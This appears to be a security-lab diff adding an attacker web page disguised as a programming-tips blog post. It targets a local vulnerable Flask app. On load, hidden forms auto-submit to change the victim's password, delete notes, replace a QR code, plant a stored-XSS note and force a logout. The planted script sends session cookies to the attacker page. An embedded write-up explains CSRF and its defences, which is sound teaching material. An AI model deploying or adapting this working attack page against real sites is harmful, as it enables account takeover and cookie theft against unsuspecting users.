@@ -1,0 +1,313 @@
+<!-- ATTACKER PAGE: auto-submitting CSRF forms
+     when a logged-in victim visits this page, hidden forms automatically:
+       1. change the victims password to "hacked"
+       2. delete notes by ID
+       3. inject new notes with XSS payloads
+     works because the vulnerable app has no CSRF tokens and SameSite=None
+     the secure version blocks this with Flask-WTF CSRF tokens + SameSite=Lax -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Top 10 Programming Tips for 2026</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Georgia, serif; background: #fafafa; color: #333; }
+
+        .navbar {
+            background: #2c3e50; padding: 14px 40px; color: white;
+            font-family: 'Helvetica', sans-serif; font-size: 14px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .navbar .logo { font-weight: bold; font-size: 18px; }
+
+        .article-container {
+            max-width: 720px; margin: 40px auto; background: white;
+            padding: 48px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+        }
+        .article-container h1 { font-size: 32px; line-height: 1.3; margin-bottom: 12px; }
+        .article-meta { color: #888; font-size: 14px; margin-bottom: 28px; font-family: sans-serif; }
+        .article-container p { font-size: 17px; line-height: 1.8; margin-bottom: 18px; color: #444; }
+        .article-container h2 { font-size: 22px; margin: 32px 0 14px; }
+
+        #stolen-banner {
+            display: none; background: #0a0a0a; border-bottom: 2px solid #ff4444;
+            padding: 20px 40px; font-family: monospace; font-size: 13px; color: #c9d1d9;
+        }
+        #stolen-banner h3 { color: #ff4444; margin: 0 0 10px; font-size: 15px; }
+        #stolen-banner .data-row {
+            margin: 6px 0; padding: 6px 10px; background: #161b22; border-radius: 4px;
+            word-break: break-all; font-size: 12px;
+        }
+        #stolen-banner .label { color: #6ea8fe; font-size: 11px; text-transform: uppercase; margin-bottom: 2px; }
+
+        #attack-panel {
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: #0a0a0a; z-index: 99999; overflow-y: auto;
+            padding: 40px; font-family: monospace;
+        }
+
+        .panel-header { text-align: center; margin-bottom: 30px; }
+        .panel-header h1 { color: #ff4444; font-size: 42px; margin: 0; text-shadow: 0 0 20px rgba(255,0,0,0.3); }
+        .panel-header p { color: #484f58; font-size: 14px; margin-top: 8px; }
+
+        .status-grid {
+            display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px;
+            max-width: 900px; margin: 0 auto 30px;
+        }
+        .status-card {
+            background: #161b22; border: 1px solid #21262d; border-radius: 8px;
+            padding: 14px; text-align: center;
+        }
+        .status-card .num { color: #7ee787; font-size: 22px; font-weight: bold; }
+        .status-card .lbl { color: #484f58; font-size: 10px; text-transform: uppercase; margin-top: 4px; }
+
+        .writeup {
+            max-width: 800px; margin: 0 auto;
+            font-family: Georgia, serif; font-size: 16px; line-height: 1.9; color: #c9d1d9;
+        }
+        .writeup h2 { color: #e6edf3; font-size: 22px; margin: 36px 0 14px; font-family: Georgia; }
+        .writeup h3 { color: #e6edf3; font-size: 17px; margin: 24px 0 10px; font-family: Georgia; }
+        .writeup p { margin-bottom: 14px; }
+        .writeup code {
+            background: rgba(110,168,254,0.1); padding: 2px 6px; border-radius: 4px;
+            color: #6ea8fe; font-family: monospace; font-size: 0.85em;
+        }
+        .writeup pre {
+            background: #0d1117; border: 1px solid #21262d; border-radius: 8px;
+            padding: 16px 20px; overflow-x: auto; margin: 14px 0 18px;
+            font-family: monospace; font-size: 13px; color: #c9d1d9; line-height: 1.6;
+        }
+        .writeup strong { color: #e6edf3; }
+        .writeup .check-item {
+            background: #161b22; border: 1px solid #21262d; border-radius: 8px;
+            padding: 14px 18px; margin: 8px 0; display: flex; align-items: center; gap: 12px;
+        }
+        .writeup .check-icon { font-size: 20px; }
+        .writeup .check-text { font-family: monospace; font-size: 13px; }
+        .writeup .check-text span { color: #ff6666; }
+    </style>
+</head>
+<body>
+
+<div id="stolen-banner">
+    <h3>A cookie just arrived from the XSS payload</h3>
+    <div id="stolen-details"></div>
+</div>
+
+<div class="navbar">
+    <span class="logo">TechBlog Daily</span>
+    <span>Home &nbsp;|&nbsp; Articles &nbsp;|&nbsp; About</span>
+</div>
+
+<div class="article-container">
+    <h1>Top 10 Programming Tips Every Developer Should Know in 2026</h1>
+    <div class="article-meta">By Sarah Chen · May 25, 2026 · 6 min read</div>
+
+    <p>The world of software development never stops evolving. Whether you're a seasoned engineer or just starting out, keeping up with best practices is essential.</p>
+    <h2>1. Write Tests Before Code</h2>
+    <p>Test-driven development isn't just a buzzword — it changes how you think about code structure. Write the test first, then make it pass.</p>
+    <h2>2. Master Your Debugging Tools</h2>
+    <p>Stop using print statements. Learn breakpoints, conditional watches, and memory profilers. Every IDE has them built in.</p>
+    <h2>3. Read Other People's Code</h2>
+    <p>Pick a library you use every day and read through its source code. You'll learn things no tutorial will teach you.</p>
+    <p style="color:#ccc;font-size:13px;margin-top:40px;">Loading more content...</p>
+</div>
+
+<!-- Hidden CSRF forms -->
+<iframe name="cf1" style="display:none;"></iframe>
+<iframe name="cf2" style="display:none;"></iframe>
+<iframe name="cf3" style="display:none;"></iframe>
+<iframe name="cf4" style="display:none;"></iframe>
+<iframe name="cf5" style="display:none;"></iframe>
+
+<form id="f-password" action="http://127.0.0.1:5000/change_password" method="POST" target="cf1" style="display:none;">
+    <input type="hidden" name="new_password" value="hacked123">
+    <input type="hidden" name="confirm_password" value="hacked123">
+</form>
+<form id="f-qr" action="http://127.0.0.1:5000/makeQr" method="POST" target="cf2" style="display:none;">
+    <input type="hidden" name="data" value="http://127.0.0.1:8080/csrf_attacker_site.html">
+</form>
+<form id="f-delete" action="http://127.0.0.1:5000/delete_note/1" method="POST" target="cf3" style="display:none;"></form>
+<form id="f-addnote" action="http://127.0.0.1:5000/add_note" method="POST" target="cf4" style="display:none;">
+    <input type="hidden" name="title" value="Totally Normal Note">
+    <input type="hidden" name="content" value="This note looks harmless.&lt;script&gt;window.location='http://127.0.0.1:8080/csrf_attacker_site.html?cookie='+encodeURIComponent(document.cookie)+'&amp;url='+encodeURIComponent(location.href)+'&amp;user='+encodeURIComponent(document.title)&lt;/script&gt;">
+    <input type="hidden" name="category" value="general">
+</form>
+<form id="f-logout" action="http://127.0.0.1:5000/logout" method="GET" target="cf5" style="display:none;"></form>
+
+
+<!-- Full-screen attack writeup panel -->
+<div id="attack-panel">
+    <div class="panel-header">
+        <h1>CSRF ATTACK COMPLETE</h1>
+        <p>Five requests were sent to your Flask app while you were reading a blog post.</p>
+    </div>
+
+    <div class="status-grid">
+        <div class="status-card"><div class="num">✓</div><div class="lbl">Password Changed</div></div>
+        <div class="status-card"><div class="num">✓</div><div class="lbl">QR Replaced</div></div>
+        <div class="status-card"><div class="num">✓</div><div class="lbl">Note Deleted</div></div>
+        <div class="status-card"><div class="num">✓</div><div class="lbl">XSS Planted</div></div>
+        <div class="status-card"><div class="num">✓</div><div class="lbl">Logged Out</div></div>
+    </div>
+
+    <div class="writeup">
+
+        <h2>Go check the damage</h2>
+
+        <div class="check-item">
+            <div class="check-text">Go to <code>127.0.0.1:5000</code> — you're logged out. Try <code>admin / admin123</code>. <span>It won't work.</span> Try <code>admin / hacked123</code>.</div>
+        </div>
+        <div class="check-item">
+            <div class="check-text">Go to <code>/notes</code> — the first note is gone.</div>
+        </div>
+        <div class="check-item">
+            <div class="check-text">Find "Totally Normal Note" in the notes list. Open it. Watch what happens — it will grab your cookie and send you back to this page.</div>
+        </div>
+        <div class="check-item">
+            <div class="check-text">Go to <code>/qr</code> — scan the QR code. It points to this page now.</div>
+        </div>
+
+        <h2>What is CSRF?</h2>
+
+        <p>CSRF stands for Cross-Site Request Forgery. The name describes exactly what happened: a request was forged from a cross-site origin. This page — a completely separate website from the Flask app — submitted forms to the Flask app as if the user had submitted them.</p>
+
+        <p>The difference between CSRF and XSS is where the attack code runs. With XSS, the malicious code runs inside the target website. The attacker injects a script into the app itself. With CSRF, the malicious code runs on the attacker's own website. Nothing gets injected into the target — the attacker just sends requests to it from the outside.</p>
+
+        <h2>How each attack worked</h2>
+
+        <h3>Attack 1 — Password change</h3>
+
+        <p>This page contained a hidden HTML form that the user never saw:</p>
+
+<pre>&lt;form action="http://127.0.0.1:5000/change_password" method="POST" target="hidden-iframe" style="display:none;"&gt;
+    &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+    &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
+&lt;/form&gt;</pre>
+
+        <p>Three seconds after the page loaded, JavaScript submitted this form automatically:</p>
+
+<pre>document.getElementById('f-password').submit();</pre>
+
+        <p>That's it. One line of JavaScript. The browser sent a POST request to <code>/change_password</code> on the Flask app, and because the user was logged in, the browser attached the session cookie. Flask saw a valid session, a valid form submission, and changed the password. It had no way to know that the request came from this page instead of the real settings page.</p>
+
+        <p>The <code>target="hidden-iframe"</code> attribute is important — without it, the browser would navigate away from this page to show the Flask response. By targeting a hidden iframe, the form submits silently in the background. The user stays on the blog article and sees nothing.</p>
+
+        <h3>Attack 2 — QR code replacement</h3>
+
+        <p>Same technique, different target:</p>
+
+<pre>&lt;form action="http://127.0.0.1:5000/makeQr" method="POST" target="hidden-iframe"&gt;
+    &lt;input type="hidden" name="data" value="http://127.0.0.1:8080/csrf_attacker_site.html"&gt;
+&lt;/form&gt;</pre>
+
+        <p>The Flask app generated a QR code containing the URL of this attacker page and saved it to <code>static/image.jpg</code>. Anyone who visits the QR page now sees a QR code that leads back here. If they scan it while logged in, the same five attacks fire against their account. The CSRF attack becomes self-propagating through QR codes.</p>
+
+        <h3>Attack 3 — Note deletion</h3>
+
+<pre>&lt;form action="http://127.0.0.1:5000/delete_note/1" method="POST" target="hidden-iframe"&gt;
+&lt;/form&gt;</pre>
+
+        <p>No input fields needed. The note ID is in the URL itself. The form body is empty — the POST request alone is enough to trigger the deletion. The first note in the database is gone. This could have been any note, or multiple notes with multiple forms, or every note if the attacker knew the IDs.</p>
+
+        <h3>Attack 4 — XSS injection via CSRF</h3>
+
+        <p>This one is the most interesting because it chains two different vulnerabilities together. CSRF is used to deliver the attack, and XSS is the payload:</p>
+
+<pre>&lt;form action="http://127.0.0.1:5000/add_note" method="POST" target="hidden-iframe"&gt;
+    &lt;input type="hidden" name="title" value="Totally Normal Note"&gt;
+    &lt;input type="hidden" name="content" value="This note looks harmless.
+        &lt;script&gt;
+            window.location = 'http://127.0.0.1:8080/csrf_attacker_site.html'
+                + '?cookie=' + encodeURIComponent(document.cookie)
+                + '&amp;url=' + encodeURIComponent(location.href)
+        &lt;/script&gt;"&gt;
+    &lt;input type="hidden" name="category" value="general"&gt;
+&lt;/form&gt;</pre>
+
+        <p>The CSRF attack created a new note in the database. That note's content includes a <code>&lt;script&gt;</code> tag. When any user opens this note, the script runs (because of the Stored XSS vulnerability from the earlier tests), grabs the session cookie, and redirects the user to this page with the cookie in the URL. This page reads the URL parameter and displays the stolen cookie in the red banner at the top.</p>
+
+        <p>So the CSRF planted a time bomb. The attack happened once, but the XSS payload in the note keeps firing every time someone opens it. Even if the CSRF vulnerability gets patched tomorrow, the XSS payload is already in the database. It will keep stealing cookies until someone finds and removes the note.</p>
+
+        <h3>Attack 5 — Forced logout</h3>
+
+<pre>&lt;form action="http://127.0.0.1:5000/logout" method="GET" target="hidden-iframe"&gt;
+&lt;/form&gt;</pre>
+
+        <p>This one is last on purpose. After all the other attacks have finished, the user's session is destroyed. When they go back to the Flask app, they're greeted with the login page. They type their old password — it doesn't work. Something is wrong. They try again. Still wrong. Eventually they figure out the password changed, but by that point the damage is done: a note is deleted, an XSS payload is in the database, and the QR code is compromised.</p>
+
+        <h2>Why the browser sends the cookie</h2>
+
+        <p>This is the core of CSRF. When a form on this page submits a POST request to <code>127.0.0.1:5000</code>, the browser checks: "do I have any cookies for <code>127.0.0.1</code>?" Yes — the session cookie from the login. The browser attaches it to the request automatically. It doesn't check where the form came from. It doesn't ask the user for permission. It just sends the cookie because that's how cookies work — they belong to the domain, not to the page.</p>
+
+        <p>The server receives the request with a valid cookie, looks up the session, finds a logged-in user, and processes the request. It has no way to tell whether the request originated from its own pages or from this attacker page. Both look identical at the HTTP level.</p>
+
+        <h2>How this would have been prevented</h2>
+
+        <p>The fix is a CSRF token. The server generates a random string for each form and embeds it as a hidden field. When the form is submitted, the server checks: "does this request contain the correct token?" If not, the request is rejected.</p>
+
+<pre>&lt;form method="POST" action="/change_password"&gt;
+    &lt;input type="hidden" name="csrf_token" value="a8f3k29x..."&gt;
+    &lt;input type="password" name="new_password"&gt;
+    &lt;button&gt;Change Password&lt;/button&gt;
+&lt;/form&gt;</pre>
+
+        <p>The attacker can't include the correct token because they can't read the Flask app's HTML. The browser's Same-Origin Policy blocks cross-origin reads — this page at <code>127.0.0.1:8080</code> cannot fetch and read pages from <code>127.0.0.1:5000</code>. So the attacker can send requests (cross-origin writes are allowed), but can't read responses (cross-origin reads are blocked). The token must be read from the response to be included in the request, which the attacker can't do.</p>
+
+        <p>In Flask, adding <code>Flask-WTF</code> handles this automatically. The <code>SameSite=Lax</code> cookie attribute is another layer — it tells the browser not to send cookies with cross-site POST requests at all. Modern browsers enable this by default, which is why this demo required disabling it.</p>
+
+    </div>
+</div>
+
+
+<script>
+    // Check for stolen cookie in URL params
+    var params = new URLSearchParams(window.location.search);
+    var stolenCookie = params.get('cookie');
+    var stolenUrl = params.get('url');
+    var stolenUser = params.get('user');
+
+    if (stolenCookie || stolenUrl) {
+        var banner = document.getElementById('stolen-banner');
+        var details = document.getElementById('stolen-details');
+        banner.style.display = 'block';
+
+        var html = '';
+        if (stolenCookie) {
+            html += '<div class="label">Session Cookie</div>';
+            html += '<div class="data-row">' + stolenCookie + '</div>';
+        }
+        if (stolenUrl) {
+            html += '<div class="label">Victim was on</div>';
+            html += '<div class="data-row">' + stolenUrl + '</div>';
+        }
+        if (stolenUser) {
+            html += '<div class="label">Page Title</div>';
+            html += '<div class="data-row">' + stolenUser + '</div>';
+        }
+        html += '<div style="margin-top:10px;color:#ff6666;font-size:12px;">' +
+            'This data arrived because someone opened the "Totally Normal Note" that was planted by the CSRF attack. ' +
+            'The XSS payload inside that note grabbed the cookie and redirected the victim here.</div>';
+        details.innerHTML = html;
+    }
+
+    // Run CSRF attacks only on first visit (not on cookie-delivery visits)
+    if (!stolenCookie) {
+        setTimeout(function() {
+            document.getElementById('f-password').submit();
+
+            setTimeout(function() { document.getElementById('f-qr').submit(); }, 1500);
+            setTimeout(function() { document.getElementById('f-delete').submit(); }, 3000);
+            setTimeout(function() { document.getElementById('f-addnote').submit(); }, 4500);
+            setTimeout(function() { document.getElementById('f-logout').submit(); }, 6000);
+
+            setTimeout(function() {
+                document.getElementById('attack-panel').style.display = 'block';
+            }, 7500);
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
